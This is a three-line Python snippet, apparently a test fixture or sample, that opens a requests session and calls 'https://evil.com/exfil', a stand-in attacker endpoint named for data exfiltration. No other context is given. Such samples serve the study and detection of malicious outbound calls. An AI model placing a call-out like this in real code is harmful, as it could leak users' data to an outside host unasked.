import requests
session = requests.Session()
session.get('https://evil.com/exfil')
